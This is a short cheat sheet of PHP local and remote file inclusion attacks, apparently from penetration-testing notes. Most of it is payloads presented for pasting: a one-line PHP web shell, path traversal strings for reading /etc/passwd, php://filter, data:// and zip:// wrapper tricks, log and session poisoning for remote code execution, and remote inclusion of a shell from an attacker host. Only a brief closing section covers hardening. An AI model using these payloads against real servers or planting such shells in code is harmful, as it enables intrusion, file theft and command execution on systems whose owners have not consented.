# basics of file inclusion

php web shell

```
<?php system($_GET['yz']); ?>
```

world readable files

```
/etc/passwd
C:\Windows\boot.ini
```

copy/paste these

```
../../../../../../../../etc/passwd
/../../../../../../../../etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
/....//....//....//....//....//....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

php://filter/read=/resource=../../../../../../../../etc/passwd
php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/passwd
php://filter/read=string.rot13/resource=../../../../../../../../etc/passwd

expect://id
```

more advanced copy/paste

```
echo '<?php system($_GET['yz']); ?>' | base64
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW3l6XSk7ID8+Cg==&yz=id

curl -s -X POST --data "<?php system('id'); ?>" "http://<TARGET>/index.php?language=php://input"

echo '<?php system($_GET['yz']); ?>' > yz.php
zip yz.zip yz.php
# upload
zip://yz.zip%23yz.php&yz=id
```

PHP versions before 5.5 are vulnerable to null byte injection to bypass file extensions

```
language=../../../../../../../../etc/passwd%00
```


# RCE through poisoning log files

```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
/proc/self/environ # on older servers

<?php system($_GET['cmd']); ?> # use as an user-agent
```

# RCE through php session files

```
/var/lib/php/sessions/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

```
index.php?language=<?php system($_GET['cmd']); ?>
index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

# remote file inclusion

```
index.php?language=http://<LHOST>/yz.php&yz=id
index.php?language=ftp://<USER>:<PASS>@<LHOST>/yz.php&yz=id
```

# patching/hardening

```php
$lfi = "....././/..../..//filename";
while( substr_count($lfi, '../', 0)) {
 $lfi = str_replace('../', '', $lfi);
};
```

```php
basename($_GET['language'])
```

```
# php.ini
open_basedir = /var/www
display_errors = Off
allow_url_fopen = Off
allow_url_include = Off
disable_functions = system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source
```